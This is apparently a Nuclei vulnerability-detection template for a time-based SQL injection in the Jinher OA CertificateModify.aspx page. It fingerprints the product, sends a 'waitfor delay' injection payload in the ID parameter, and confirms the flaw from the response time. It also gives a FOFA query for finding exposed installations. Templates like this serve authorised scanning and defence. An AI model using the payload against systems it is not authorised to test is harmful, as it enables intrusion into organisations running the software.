id: jinher-jhsoft-certificatemodify-aspx-sqli
info:
  name: Jinher OA CertificateModify.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: Jinher OA
    fofa: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Certificate/CertificateModify.aspx/?ID=1'waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "证书修改"
          - "用户编号"
          - "设备编号"
      - type: dsl
        dsl:
          - "duration >= to_number(t1) && duration <= to_number(t2)"
